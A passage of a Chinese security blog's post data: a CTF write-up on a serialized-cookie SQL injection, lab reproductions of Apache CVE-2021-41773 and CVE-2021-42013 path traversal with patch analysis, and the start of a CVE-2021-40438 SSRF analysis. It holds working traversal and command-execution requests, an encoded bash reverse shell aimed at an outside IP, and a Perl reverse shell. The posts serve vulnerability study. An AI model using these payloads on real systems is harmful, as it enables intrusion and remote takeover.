SQL();\t$sql-&gt;connect();\t$sql-&gt;table = $table;    $sql-&gt;username = $username;    $sql-&gt;password = $password;    $sql-&gt;check_login();&#125;?&gt;\nip.php\n&lt;?phpecho $_SERVER[&#x27;REMOTE_ADDR&#x27;];\n先访问ip.php拿到ip：218.26.154.43\n\n这里看代码发现cookie也会自动设置，因此我们查看一下\n\n发现疑似base64的，解码一下看看\n\n方法一：\n所得到已知信息\n1.在Cookie中存在序列化字符串,用来记录访问者IP\n2.前端传入username,password时,首先会被转义再进行过滤,只能使用 ’ 符号\n3.在conn.php文件中存在一个SQL方法,其中waf过滤函数将table,username,password参数都进行了过滤,但是table参数没有进行addslashes()函数转义处理\n构造poc\nO:3:&quot;SQL&quot;:4:&#123;s:5:&quot;table&quot;;s:41:&quot;(select &#x27;admin&#x27; username,&#x27;123&#x27; password)a&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;s:4:&quot;conn&quot;;N;&#125;&#125;\n这里解释一下table内容的含义： ’ or ‘1’='1\nselect 值1   字段1，值2，字段2\n可以生成表\n\n\n\n字段1\n字段2\n\n\n\n\n值1\n值2\n\n\n\n上述属于sql中的子查询，且子查询后面必须跟一个别名，解释如下：\n在复杂查询语句中，我们可能会用到子查询。\nselect id from (select * from table_name)a\n上面我们将子查询查询出来的结果当成一张新表来操作。同时，为这张新表指定了别名 a ，这个别名是一定需要指定的，否则会报错。\n所以上述序列化字符串执行后，相当于建立了一个新表，名字为a，其中用户名值为admin，密码为123。符合代码中username=admin的要求\nbase64编码后，传入cookie\nTzozOiJTUUwiOjQ6e3M6NToidGFibGUiO3M6NDE6IihzZWxlY3QgJ2FkbWluJyB1c2VybmFtZSwnMTIzJyBwYXNzd29yZClhIjtzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7czo0OiJjb25uIjtOO319\n\n得到flag\n方法二：\n这里也可以采用类似如下poc\nO:3:&quot;SQL&quot;:5:&#123;s:5:&quot;table&quot;;s:5:&quot;users&quot;;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:11:&quot;&#x27; or &#x27;1&#x27;=&#x27;1&quot;;s:4:&quot;conn&quot;;N;s:10:&quot;SQL_wakeup&quot;;N;&#125;\n由于前端页面对用户名和密码进行了字符转义，那我们可以通过sql语句来绕过前端转义，接着在进行数据库查询时，由于passowrd是万能密码，于是成功绕过，实现username=admin\n参考文章：\n【愚公系列】2023年06月 攻防世界-Web（题目名称-warmup）\n其余可以等提交了flag，查看题目自带wp\n","categories":["攻防世界"]},{"title":"Apache HTTP Server 2.4.49 路径穿越漏洞 CVE-2021-41773","url":"/2023/09/16/Apache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/","content":"0x01 漏洞概述\nApache HTTP Server（简称 Apache）是开源的 Web 服务器，可以在大多数计算机操作系统中运行，由于其多平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的 API 扩展，将 Perl/Python 等解释器编译到服务器中。\nApache 披露了一个在 Apache HTTP Server 2.4.49 上引入的漏洞，称为 CVE-2021-41773。同时发布了2.4.50更新，修复了这个漏洞。该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。运行此版本 Apache 的 Linux 和 Windows 服务器都受到影响。此漏洞是在 2.4.49 中引入的，该补丁旨在提高 URL 验证的性能。可以通过对“.”进行编码来绕过新的验证方法。\n该漏洞仅影响2.4.49版本，此外还需要在配置文件中允许访问穿越的目录，如&lt;Directory /&gt;Require all granted&lt;/Directory&gt;，使用默认配置的Apache HTTP Server不受影响。\n在服务器开启cgi或cgid模块的情况下，该漏洞可执行任意命令。\n0x02 漏洞成因\nApache HTTP Server 2.4.49版本使用的ap_normalize_path函数在对路径做过滤的时候没有过滤干净。\nap_normalize_path函数如下\n/* * Inspired by mod_jk&#x27;s jk_servlet_normalize(). */AP_DECLARE(int) ap_normalize_path(char *path, unsigned int flags)&#123;    int ret = 1;    apr_size_t l = 1, w = 1;    if (!IS_SLASH(path[0])) &#123;        /* Besides &quot;OPTIONS *&quot;, a request-target should start with &#x27;/&#x27;         * per RFC 7230 section 5.3, so anything else is invalid.         */        if (path[0] == &#x27;*&#x27; &amp;&amp; path[1] == &#x27;\\0&#x27;) &#123;            return 1;        &#125;        /* However, AP_NORMALIZE_ALLOW_RELATIVE can be used to bypass         * this restriction (e.g. for subrequest file lookups).         */        if (!(flags &amp; AP_NORMALIZE_ALLOW_RELATIVE) || path[0] == &#x27;\\0&#x27;) &#123;            return 0;        &#125;        l = w = 0;    &#125;    // 遍历路径字符串，一边做url解码一边检测 &#x27;..&#x27;，出现漏洞。    while (path[l] != &#x27;\\0&#x27;) &#123;        /* RFC-3986 section 2.3:         *  For consistency, percent-encoded octets in the ranges of         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]         *  be decoded to their corresponding unreserved characters by         *  URI normalizers.         */        // 这一段是在做URL解码        // 检测到当前位为‘%’，接下来两位为十六进制数字就进入if        if ((flags &amp; AP_NORMALIZE_DECODE_UNRESERVED)                &amp;&amp; path[l] == &#x27;%&#x27; &amp;&amp; apr_isxdigit(path[l + 1])                                  &amp;&amp; apr_isxdigit(path[l + 2])) &#123;            const char c = x2c(&amp;path[l + 1]); // 将url编码转换为字符（16进制转char）            if (apr_isalnum(c) || (c &amp;&amp; strchr(&quot;-._~&quot;, c))) &#123;                /* Replace last char and fall through as the current                 * read position */                l += 2;                path[l] = c;            &#125;        &#125;        if ((flags &amp; AP_NORMALIZE_DROP_PARAMETERS) &amp;&amp; path[l] == &#x27;;&#x27;) &#123;            do &#123;                l++;            &#125; while (!IS_SLASH_OR_NUL(path[l]));            continue;        &#125;        // 如果path[0]不是斜杠，且不是* 或者空串，w就会置为0。        // 如果w = 0 或者 paht[0]是斜杠，就进入循环。        if (w == 0 || IS_SLASH(path[w - 1])) &#123;            /* Collapse ///// sequences to / */            //跳过连续的斜杠            if ((flags &amp; AP_NORMALIZE_MERGE_SLASHES) &amp;&amp; IS_SLASH(path[l])) &#123;                do &#123;                    l++;                &#125; while (IS_SLASH(path[l]));                continue;            &#125;            //如果检测到点号            if (path[l] == &#x27;.&#x27;) &#123;                /* Remove /./ segments */                if (IS_SLASH_OR_NUL(path[l + 1])) &#123;                    l++;                    if (path[l]) &#123;                        l++;                    &#125;                    continue;                &#125;                /* Remove /xx/../ segments */                // 如果点号的下一个还是点号，就要删一点了                if (path[l + 1] == &#x27;.&#x27; &amp;&amp; IS_SLASH_OR_NUL(path[l + 2])) &#123;                    /* Wind w back to remove the previous segment */                    if (w &gt; 1) &#123;                        do &#123;                            w--;                        &#125; while (w &amp;&amp; !IS_SLASH(path[w - 1]));                    &#125;                    else &#123;                        /* Already at root, ignore and return a failure                         * if asked to.                         */                        if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) &#123;                            ret = 0;                        &#125;                    &#125;                    /* Move l forward to the next segment */                    l += 2;                    if (path[l]) &#123;                        l++;                    &#125;                    continue;                &#125;            &#125;        &#125;        path[w++] = path[l++];    &#125;    path[w] = &#x27;\\0&#x27;;    return ret;&#125;\n可以看到，漏洞的产生原因是其遍历一整个路径字符串，对每一位，先进行url解码，然后检测是不是当前位和下一位的组合是不是两个点..\n他能检测出的情况如下\n..%2e.    // 正在处理第一位，解码后发现是..组合\n然而如果遇到这种情况\n.%2e    // 解码第一位，仍然是.%2e，没有检测到..组合%2e%2e  // 解码第一位，解成.%2e，仍然无法检测到..组合\n0x03 漏洞复现\n启动后，访问环境ip 8080端口看到“It Works!”表明环境启动成功\n发送以下payload成功读取/etc/passwd文件\n\n/icons/目录是一个存在且可访问的目录，测试时也可改为其他目录如/cgi-bin/，但在本环境中/cgi-bin/目录访问状态码为403，因此使用了/icons/目录\n\nGET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd Host: 192.168.26.103:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close\n![image-20230916163701796](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163701796.png)\n执行命令\nPOST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh Host: 192.168.26.103:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 46echo Content-Type: text/plain; echo; id; uname\n![image-20230916163905857](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916163905857.png)\n0x04  漏洞修复\n1）41773——2.4.50版本对ap_normalize_path函数进行修改，补充了如下代码，对.%2e的绕过形式进行了判断，可以避免使用该方法绕过。\nif ((path[n] == &#x27;.&#x27; || (decode_unreserved    &amp;&amp; path[n] == &#x27;%&#x27;    &amp;&amp; path[++n] == &#x27;2&#x27;    &amp;&amp; (path[++n] == &#x27;e&#x27;    || path[n] == &#x27;E&#x27;)))    &amp;&amp; IS_SLASH_OR_NUL(path[n + 1])) &#123;    /* Wind w back to remove the previous segment */    if (w &gt; 1) &#123;        do &#123;            w--;        &#125; while (w &amp;&amp; !IS_SLASH(path[w - 1]));    &#125;    else &#123;        /* Already at root, ignore and return a failure            * if asked to.            */        if (flags &amp; AP_NORMALIZE_NOT_ABOVE_ROOT) &#123;            ret = 0;        &#125;    &#125;    /* Move l forward to the next segment */    l = n + 1;    if (path[l]) &#123;        l++;    &#125;    continue;&#125;&lt;br&gt;————https://xz.aliyun.com/t/10359?page=1\n2）42013——2.4.51版本针对该漏洞进行了多处修改，最核心的一处修改是在ap_normalize_path函数中加强了对url编码的校验，如果检测到存在非标准url编码（%+两个十六进制字符）的情况，就返回编码错误，从根本上杜绝了多重编码可能导致的绕过，修复代码如下：\nwhile (path[l] != &#x27;\\0&#x27;) &#123;    /* RFC-3986 section 2.3:        *  For consistency, percent-encoded octets in the ranges of        *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),        *  period (%2E), underscore (%5F), or tilde (%7E) should [...]        *  be decoded to their corresponding unreserved characters by        *  URI normalizers.        */    if (decode_unreserved &amp;&amp; path[l] == &#x27;%&#x27;) &#123;        if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) &#123;            const char c = x2c(&amp;path[l + 1]);            if (TEST_CHAR(c, T_URI_UNRESERVED)) &#123;                /* Replace last char and fall through as the current                    * read position */                l += 2;                path[l] = c;            &#125;        &#125;        else &#123;            /* Invalid encoding */            ret = 0;        &#125;    &#125;————https://xz.aliyun.com/t/10359?page=1\n0x05 POC利用\n项目地址参考：\nhttps://github.com/lorddemon/CVE-2021-41773-PoC/\nhttps://github.com/0xAlmighty/CVE-2021-41773-PoC\n这里推荐第二个，因为我第一个没成功\n![image-20230916170222150](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170222150.png)\n![image-20230916170230540](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170230540.png)\n不过在利用第二个的时候如果在明确有漏洞但仍未利用的，那需要大家去py修改一些内容，比如端口，或者穿越路径时的%2e的数量等等\n0x06 参考文章\n[CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现]\nCVE-2021-41773 Apache HTTP Server路径遍历漏洞0day\nApache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现\nApahce HTTPd 2.4.49（CVE-2021-41773）漏洞复现详细教程\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)","url":"/2023/09/16/Apache%20HTTP%20Server%202.4.50%20%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%92%8C%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20(CVE-2021-42013)/","content":"0x01 漏洞描述\nApache HTTP Server 2.4.50版本对CVE-2021-41773漏洞进行了修复，由于修复不完善，攻击者可绕过补丁，读取web目录之外的文件，在开启cgi模块时，可执行任意命令。\n该漏洞影响Apache HTTP Server 2.4.49和2.4.50两个版本，利用条件和CVE-2021-41773相同\n0x02 漏洞成因\nApache使用函数 ap_process_request_internal来处理外部请求\nAP_DECLARE(int) ap_process_request_internal(request_rec *r)&#123;    .....    //调用 ap_normalize_path ，先对字符串进行解码。    if (r-&gt;parsed_uri.path) &#123;        /* Normalize: remove /./ and shrink /../ segments, plus         * decode unreserved chars (first time only to avoid         * double decoding after ap_unescape_url() below).         */        if (!ap_normalize_path(r-&gt;parsed_uri.path,                               normalize_flags |                               AP_NORMALIZE_DECODE_UNRESERVED)) &#123;            ap_log_rerror(APLOG_MARK, APLOG_ERR, 0, r, APLOGNO(10244)                          &quot;invalid URI path (%s)&quot;, r-&gt;unparsed_uri);            return HTTP_BAD_REQUEST;        &#125;    &#125;    .....    // 再调用 ap_unescape_url，对字符串解码过滤。    /* Ignore URL unescaping for translated URIs already */    if (access_status != DONE &amp;&amp; r-&gt;parsed_uri.path) &#123;        core_dir_config *d = ap_get_core_module_config(r-&gt;per_dir_config);        if (d-&gt;allow_encoded_slashes) &#123;            access_status = ap_unescape_url_keep2f(r-&gt;parsed_uri.path,                                                   d-&gt;decode_encoded_slashes);        &#125;        else &#123;            access_status = ap_unescape_url(r-&gt;parsed_uri.path);        &#125;        if (access_status) &#123;            if (access_status == HTTP_NOT_FOUND) &#123;                if (! d-&gt;allow_encoded_slashes) &#123;                    ap_log_rerror(APLOG_MARK, APLOG_INFO, 0, r, APLOGNO(00026)                                  &quot;found %%2f (encoded &#x27;/&#x27;) in URI path (%s), &quot;                                  &quot;returning 404&quot;, r-&gt;unparsed_uri);                &#125;            &#125;            return access_status;        &#125;        .....    &#125;    .....\n开发为了保险起见，反复解码过滤，但是这反而弄巧成拙，造成二次编码注入。\n%32e --&gt; %2e --&gt; .%32 = 2%2e = .\n​\t\t因为该漏洞是在CVE-2021-41773修复的基础上，还会造成路径穿越。这时修复了对.%2e的检测。在处理外部HTTP请求时，会调用ap_process_request_internal函数对url路径进行处理，在该函数中，首先会调用ap_normalize_path函数进行一次url解码，之后会调用ap_unescape_url函数进行二次解码。这时候我们只需要将../url编码两次就行了。\nap_normalize_path函数调用栈如下，\n1. 在处理前path参数为/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd2. 经过`ap_normalize_path`函数处理后path参数变成/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd3. 经过`unescape_url`函数处理后，可以看到此时的url字符串内容变成/icons/../../../../etc/passwd\n补充一下：对于没有进行安全配置的Apache服务器，默认情况可以⽤xxx.com/icons/的方式打开Apache目录下的icons文件夹，并且会罗列出文件列表。\n如果我们采用二次编码，这里我认为是第一次解码校验不严谨，随后调用下一个解码函数进行url解码默认为该url已经安全，导致二次编码注入\n0x03 漏洞复现\n在CVE-2021-41773中使用/.%2e/%2e%2e/%2e%2e进行路径穿越，在2.4.50中已无法使用，但对2e再进行url编码，即%32%65，仍可实现路径穿越\nPOST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1Host: 192.168.26.103:8080Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: https://fofa.so/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 46echo Content-Type: text/plain; echo; id; uname\n![image-20230916172825780](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916172825780.png)\n![image-20230916172906714](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916172906714.png)\n写入反弹shell\ncurl -v --data &quot;echo;echo &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&gt;&gt; /tmp/shell.sh&quot; &#x27;http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;\n![image-20230916175907480](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916175907480.png)\n执行反弹shell\ncurl -v --data &quot;echo;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIzMy4yNi85OTk5IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot; &#x27;http://192.168.17.128:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh&#x27;\n![image-20230916191148783](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916191148783.png)\n![image-20230916191338640](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916191338640.png)\n这里反弹也花了很大时间，一直不成功，搜了多个文章发现，这里的容器环境/bin/bash指向的dash，但我们用的是bash命令，故此行不通，但那位佬用了bash -c的方法，成功写入并执行。到这里还需注意，若果你用的vps那么厂商的安全组以及宝塔的安全组都要开启，否则不能反弹（我是如此，不知道大家）。\n当然这里也能用perl反弹，因为该容器有perl环境\nperl -e &#x27;use Socket;$i=&quot;ip&quot;;$p=9999;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;\n0x04 漏洞修复\n2.4.51版本中采用了白名单的机制，在ap_normalize_path中加强了对url编码的校验，只允许数字、字母及特定的符号编码，如果是白名单以外的url编码，就直接报错，不继续搞了\nwhile (path[l] != &#x27;\\0&#x27;) &#123;        /* RFC-3986 section 2.3:         *  For consistency, percent-encoded octets in the ranges of         *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),         *  period (%2E), underscore (%5F), or tilde (%7E) should [...]         *  be decoded to their corresponding unreserved characters by         *  URI normalizers.         */        //就只允许上面注释写到的内容，如果存在这以外的内容，就直接报错。        if (decode_unreserved &amp;&amp; path[l] == &#x27;%&#x27;) &#123;            if (apr_isxdigit(path[l + 1]) &amp;&amp; apr_isxdigit(path[l + 2])) &#123;                const char c = x2c(&amp;path[l + 1]);                if (TEST_CHAR(c, T_URI_UNRESERVED)) &#123;                    /* Replace last char and fall through as the current                     * read position */                    l += 2;                    path[l] = c;                &#125;            &#125;            else &#123;                /* Invalid encoding */                ret = 0;            &#125;        &#125;\n这里真的是看不懂佬对代码的分析，太难了。。。还是先弄懂原理吧\n0x05 检测工具\nApache 2.4.49 (CVE-2021-41773)\nApache 2.4.50 (CVE-2021-42013)\n批量多线程检测工具：\nGithub地址：\nhttps://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013\n![image-20230916192049781](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916192049781.png)\n![image-20230916192111424](Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)/image-20230916192111424.png)\n0x06 参考文章\nCVE-2021-41773 &amp;&amp; CVE-2021-42013\nApache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现\nCVE-2021-42013 Apache HTTP Server 路径穿越漏洞\n【Vulfocus解题复现】Apache HTTP Server 路径穿越漏洞（CVE-2021-42013）\ncve-2021-41773和cve-2021-42013的分析 --值得参考\nApache HTTP Server 2.4.50 路径穿越漏洞 CVE-2021-42013\napache-CVE-2021-41773[42013]-反弹shell\n反弹shell的方法总结\nApache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013) 检测工具\n","categories":["CVE漏洞"],"tags":["CVE"]},{"title":"Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)","url":"/2023/09/16/Apache%20HTTP%20%E6%9C%8D%E5%8A%A1%E5%99%A8%202.4.48%20mod_proxy%20SSRF%20(CVE-2021-40438)/","content":"0x01 前言\n又是一篇漏洞复现，虽然我至今复现了许多CVE漏洞，但心中总是感觉缺少点什么，复现的时候看到那些大佬的分析方法，步骤及思路，让我叹为观止（这令我产生了一种“错觉”？漏洞复现本就是深入底层代码去分析漏洞原理吗？）当然很明显本就应该这样做，但对于新手的我来说，这种方法却似乎成为了一堵高墙，我在想我究竟是要跟着大佬去代码世界走一遭还是单纯理解漏洞如何产生，影响范围，如何利用就好了。\n虽然目前心中还是没有明确答案，但我似乎应该清醒一些，那些佬一定有着深厚的功底，因此这些复现的技术方法本就是他们的基操，而对于目前新手的我来说，面对如此庞大的代码量，且菜鸡的我目前为止，对于一些简单的代码程序的普通调试，也没有熟练甚至很菜。因此我认为我这或许潜移默化中形成了–眼高手低–的心理吗？\n但不论如何说，什么能力办什么事，因此我目前为止对于此种漏洞的态度为，尽自己最大能力搞清楚原理，跟着大佬的思路走上一遭，哪怕记不住，但或许对自己代码审计能力也能提高一些，故此没必要焦虑，只希望自己在日后有能力之后，可以蓦然回首，遨游于代码世界。\n上述也是发表了一下心中的小小感慨，但还是不够彻底，不过想起一句话，在自己目前认为什么也想干但却不知干什么，或者甚至什么也不想做，那也要在自己热爱的方面一直学下去，或许哪一篇文章，哪一句话，哪一个人，就给了你奇思妙想的思路。。。。不多说了，开始学习。\n0x02 前置知识\n这里呢就跟着佬的思路走一遍，过点脑子即可。\nApache Module综述\n如果我们要部署一个PHP运行环境，且将Apache作为Web应用服务器，那么常用的有三种方法：\n\nApache以CGI的形式运行PHP脚本\nPHP以mod_php的方式作为Apache的一个模块运行\nPHP以FPM的方式运行为独立服务，Apache使用mod_proxy_fcgi模块作为反代服务器将请求代理给PHP-FPM\n\n第一种方式比较古老，性能较差，基本已经淘汰；第二种方式在Apache环境下使用较广，配置最为简单；第三种方法也有较大用户体量，不过Apache仅作为一个中间的反代服务器，更多新的用户会选择使用性能更好的Nginx替代。\n这其中，第三种方法使用的mod_proxy_fcgi就是本文主角mod_proxy模块的一个子模块。mod_proxy是Apache服务器中用于反代后端服务的一个模块，而它拥有数个不同功能的子模块，分别用于支持不同通信协议的后端，比如常见的有：\n\nmod_proxy_fcgi 用于反代后端是fastcgi协议的服务，比如php-fpm\nmod_proxy_http 用于反代后端是http、https协议的服务\nmod_proxy_uwsgi 用于反代后端是uwsgi协议的服务，主要针对uWSGI\nmod_proxy_ajp 用于反代后端是ajp协议的服务，主要针对Tomcat\nmod_proxy_ftp 用于反代后端是ftp协议的服务\n\n除去mod_proxy_fcgi用于反代PHP，我们在使用Node.js、Python等脚本语言编写的应用也常常会使用mod_proxy_http作为一层反代服务器，这样中间层可以做ACL、静态文件服务等。\n这次的SSRF漏洞是出在mod_proxy这个模块中的，我们就来从代码的层面分析一下它的原理是什么，究竟影响有多大。\n0x03 漏洞原理分析\n《Building a POC for CVE-2021-40438》这篇文章中提到了这个漏洞的复现方法：当目标环境使用了mod_proxy做反向代理，比如ProxyPass / &quot;http://localhost:8000/&quot;，此时通过请求http://target/?unix:&#123;'A'*5000&#125;|http://example.com/即可向http://example.com发送请求，造成一个SSRF攻击。\n这里面，Apache代码中犯得错误是在modules/proxy/proxy_util.c的fix_uds_filename函数：\n/* * In the case of the reverse proxy, we need to see if we * were passed a UDS url (eg: from mod_proxy) and adjust uds_path * as required.   */static void fix_uds_filename(request_rec *r, char **url) &#123;    char *ptr, *ptr2;    if (!r || !r-&gt;filename) return;    if (!strncmp(r-&gt;filename, &quot;proxy:&quot;, 6) &amp;&amp;            (ptr2 = ap_strcasestr(r-&gt;filename, &quot;unix:&quot;)) &amp;&amp;            (ptr = ap_strchr(ptr2, &#x27;|&#x27;))) &#123;        apr_uri_t urisock;        apr_status_t rv;        *ptr = &#x27;\\0&#x27;;        rv = apr_uri_parse(r-&gt;pool, ptr2, &amp;urisock);        if (rv == APR_SUCCESS) &#123;            char *rurl = ptr+1;            char *sockpath = ap_runtime_dir_relative(r-&gt;pool, urisock.path);            apr_table_setn(r-&gt;notes, &quot;uds_path&quot;, sockpath);            *url = apr_pstrdup(r-&gt;pool, rurl); /* so we get the scheme for the uds */            /* r-&gt;filename starts w/ &quot;proxy:&quot;, so add after that */            memmove(r-&gt;filename+6, rurl, strlen(rurl)+1);            ap_log_rerror(APLOG_MARK, APLOG_TRACE2, 0, r,                    &quot;*: rewrite of url due to UDS(%s): %s (%s)&quot;,                    sockpath, *url, r-&gt;filename);        &#125;        else &#123;            *ptr = &#x27;|&#x27;;        &#125;    &#125;&#125;\nApache在配置反代的后端服务器时，有两种情况：\n\n直接使用某个协议反代到某个IP和端口，比如ProxyPass / &quot;http://localhost:8080&quot;\n使用某个协议反代到unix套接字，比如ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;\n\n第一种情况比较好理解，第二种情况的设计我觉得不是很好，相当于让用户可以使用一个Apache自创的写法来配置后端地址。那么这时候就会涉及到parse的过程，需要将这种自创的语法转换成能兼容正常socket连接的结构，而fix_uds_filename函数就是做这个事情的。\n使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件：\n\nr-&gt;filename的前6个字符等于proxy:\nr-&gt;filename的字符串中含有关键字unix:\nunix:关键字后的部分含有字符|\n\n当满足这三个条件后，将unix:后面的内容进行解析，设置成uds_path的值；将字符|后面的内容，设置成rurl的值。\n举个例子，前面介绍中的ProxyPass / &quot;unix:/var/run/www.sock|http://localhost:8080/&quot;，在解析完成后，uds_path的值等于/var/run/www.sock，rurl的值等于http://localhost:8080/。\n这里上一个GPT解释：\n这段代码是 C 语言代码，用于 Apache HTTP 服务器的模块开发。该代码位于一个函数 `fix_uds_filename` 中，用于处理反向代理（reverse proxy）中的请求，特别是在处理传递了 UDS（Unix Domain Socket）URL 的情况下。以下是对该代码的分析：1. `fix_uds_filename` 函数是一个静态函数，它接受两个参数：`request_rec *r` 和 `char **url`。`request_rec` 是 Apache HTTP 服务器处理请求时的核心数据结构，而 `char **url` 是一个指向指针的指针，用于传递 URL。2. 函数开始的注释解释了它的目的，即在反向代理中，检查是否传递了 UDS URL（例如来自 mod_proxy 模块），并根据需要调整 UDS 路径。3. 接下来，代码对输入参数进行了一些基本的有效性检查，确保 `r` 和 `r-&gt;filename` 不为空。如果为空，函数就会直接返回，不执行后续操作。4. 接下来，代码检查 `r-&gt;filename` 是否以 &quot;proxy:&quot; 开头，并且是否包含 &quot;unix:&quot; 和 &quot;|&quot;。这些条件用于识别传递的 UDS URL。5. 如果满足条件，代码会使用 Apache 的函数 `ap_strcasestr` 和 `ap_strchr` 来分析 URL，并解析其中的 UDS 路径。6. 一旦成功解析 UDS 路径，代码会将其存储在 `apr_table_t` 数据结构中的 &quot;uds_path&quot; 键下，并将 UDS URL 的剩余部分存储在 `url` 指针所指向的位置。7. 接下来，代码更新 `r-&gt;filename`，将 &quot;proxy:&quot; 后面的部分替换为解析出的 UDS URL。8. 最后，代码使用 `ap_log_rerror` 函数记录一条日志，指示已经因为 UDS URL 的存在而重写了 URL。总之，这段代码的主要目的是在处理反向代理请求时，检查传递的 URL 是否包含 UDS 部分，如果包含，则解析出 UDS 路径，并进行一些必要的更新和日志记录。这有助于在反向代理中正确处理使用 Unix 域套接字的情况。\n这里我们先搞清楚代码是干什么的即可。\n看到这里其实都没有什么问题，那么我们肯定会思考，r-&gt;filename是从哪来的，用户可控吗，为什么？\n这时就要说到另一个函数，proxy_hook_canon_handler，这个函数用于注册canon handler，比如：\n![image-20230916154849448](Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)/image-20230916154849448.png)\n可以看到，每一个mod_proxy_xxx都会注册一个自己的canon handler，canon handler会在反代的时候被调用，用于告诉Apache主程序它应该把这个请求交给哪个处理方法来处理。\n比如，我们看到mod_proxy_http的proxy_http_canon函数：\nstatic int proxy_http_canon(request_rec *r, char *url)&#123;    // ...    // first part    if (strncasecmp(url, &quot;http:&quot;, 5) == 0) &#123;        url += 5;        scheme = &quot;http&quot;;    &#125;    else if (strncasecmp(url, &quot;https:&quot;, 6) == 0) &#123;        url += 6;        scheme = &quot;https&quot;;    &#125;    else &#123;        return DECLINED;    &#125;    port = def_port = 